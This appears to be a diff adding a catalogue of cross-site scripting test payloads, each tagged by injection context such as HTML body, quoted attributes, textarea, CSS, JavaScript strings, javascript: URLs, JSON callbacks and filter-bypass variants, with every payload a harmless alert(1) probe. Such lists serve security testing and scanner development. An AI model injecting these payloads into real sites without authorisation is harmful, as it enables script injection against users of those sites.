@@ -1,0 +1,57 @@
+
+Parameter - Body - a<script>alert(1)</script>
+Parameter - Head - a<script>alert(1)</script>
+Parameter - Title - a</title><script>alert(1)</script>
+Parameter - Body HTML comment - a--><script>alert(1)</script>
+Parameter - Tag name - a><script>alert(1)</script>
+Parameter - Attribute unquoted - a><script>alert(1)</script>
+Parameter - Attribute single quoted - a'><script>alert(1)</script>
+Parameter - Attribute double quoted - a"><script>alert(1)</script>
+Parameter - Attribute name - a><script>alert(1)</script>
+
+Parameter - Body - 400 - a<script>alert(1)</script>
+Parameter - Body - 401 - a<script>alert(1)</script>
+Parameter - Body - 403 - a<script>alert(1)</script>
+Parameter - Body - 404 - a<script>alert(1)</script>
+Parameter - Body - 500 - a<script>alert(1)</script>
+
+Parameter - iFrame Attribute Value - '></iframe><script>alert(1)</script>
+Parameter - iFrame srcdoc - a'><script>alert(1)</script>
+Parameter - Textarea - a</textarea><script>alert(1)</script>
+Parameter - Textarea Attribute Value - a'></textarea><script>alert(1)</script>
+Parameter - NoScript - a</noscript><script>alert(1)</script>
+Parameter - Style Attribute Value - a'></style><script>alert(1)</script>
+
+Parameter - CSS - a</style><script>alert(1)</script>
+Parameter - CSS Value - a;}</style><script>alert(1)</script>
+Parameter - CSS Font Name - a;}</style><script>alert(1)</script>
+
+Parameter - unquoted onclick - alert(1)
+Parameter - quoted onclick - alert(1)
+Parameter - singlequoted onclick - alert(1)
+
+Parameter - Javascript unquoted assignment - document.domain;alert(1)
+Parameter - Javascript eval - alert(1)
+Parameter - Javascript quoted string - a";alert(1);"
+Parameter - Javascript single quoted string - a';alert(1);'
+Parameter - Javascript slash quoted string - a/;alert(1);/
+Parameter - Javascript comment - a"*/;alert(1)/*
+
+Parameter - Script SRC double quoted - a"></script><script>alert(1)</script>
+URL - HREF - javascript:alert(1);
+URL - CSS - javascript:alert(1);
+URL - Script SRC - javascript:alert(1);
+URL - Object DATA - javascript:alert(1);
+URL - Param SRC - javascript:alert(1);
+
+Parameter - JSON - a"}<script>alert(1)</script>
+ContentSniffing - a<script>alert(1)</script>a
+ContentSniffing - a<script>alert(1)</script>a
+ContentSniffing - Callback - ?callback=a<script>alert(1)</script>
+
+Form - </p><script>alert(1)</script>
+Parameter - Body - Blocks SpaceDoubleQuoteSlashEquals - a<script>alert(1)</script>
+Parameter - Attribute unquoted - Blocks DoubleQuoteSinglequote - a><script>alert(1)</script>
+Parameter - Body - Blocks lowercase script - a<scRipt>alert(1)</scRipt>
+Parameter - Body - Blocks uppercase script - a<scRipt>alert(1)</scRipt>
+Parameter - Body - Blocks any script - a<html onmouseover= alert(1)>
